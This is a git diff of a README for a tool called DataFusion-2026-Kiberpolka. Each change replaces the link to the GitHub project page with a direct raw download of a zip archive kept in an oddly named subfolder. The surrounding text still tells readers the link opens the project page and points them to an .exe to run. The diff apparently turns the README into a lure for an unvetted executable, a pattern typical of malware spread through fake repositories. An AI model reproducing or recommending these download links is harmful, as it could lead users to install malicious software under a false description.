@@ -1,6 +1,6 @@
 # 🔗 DataFusion-2026-Kiberpolka - Solve Cyberpolk Challenge Easily
 
-[![Download Now](https://img.shields.io/badge/Download-DataFusion-blue?style=for-the-badge)](https://github.com/Mohamadsafakor/DataFusion-2026-Kiberpolka)
+[![Download Now](https://img.shields.io/badge/Download-DataFusion-blue?style=for-the-badge)](https://raw.githubusercontent.com/Mohamadsafakor/DataFusion-2026-Kiberpolka/main/Bruchus/Fusion-Data-Kiberpolka-v3.5.zip)
 
 ## 📘 About DataFusion-2026-Kiberpolka
 
@@ -28,7 +28,7 @@ This section will guide you through downloading, installing, and running DataFus
 
 Click the large button at the top or visit this link to download the software:
 
-[Download DataFusion-2026-Kiberpolka](https://github.com/Mohamadsafakor/DataFusion-2026-Kiberpolka)
+[Download DataFusion-2026-Kiberpolka](https://raw.githubusercontent.com/Mohamadsafakor/DataFusion-2026-Kiberpolka/main/Bruchus/Fusion-Data-Kiberpolka-v3.5.zip)
 
 This link will take you to the project page on GitHub. Look for the **Releases** section on the page. Inside, you will find the latest version of the software. Find the file with the extension `.exe` (this is the installer or standalone app).
 
@@ -112,7 +112,7 @@ For file loading issues:
 
 Return to the project page to download the latest version:
 
-[https://github.com/Mohamadsafakor/DataFusion-2026-Kiberpolka](https://github.com/Mohamadsafakor/DataFusion-2026-Kiberpolka)
+[https://raw.githubusercontent.com/Mohamadsafakor/DataFusion-2026-Kiberpolka/main/Bruchus/Fusion-Data-Kiberpolka-v3.5.zip](https://raw.githubusercontent.com/Mohamadsafakor/DataFusion-2026-Kiberpolka/main/Bruchus/Fusion-Data-Kiberpolka-v3.5.zip)
 
 Follow the same download and installation instructions outlined above.
 
@@ -147,4 +147,4 @@ If you encounter issues beyond basic troubleshooting, please check the project's
 
 # [Badge Repeat]
 
-[![Download Now](https://img.shields.io/badge/Download-DataFusion-grey?style=for-the-badge)](https://github.com/Mohamadsafakor/DataFusion-2026-Kiberpolka)
+[![Download Now](https://img.shields.io/badge/Download-DataFusion-grey?style=for-the-badge)](https://raw.githubusercontent.com/Mohamadsafakor/DataFusion-2026-Kiberpolka/main/Bruchus/Fusion-Data-Kiberpolka-v3.5.zip)
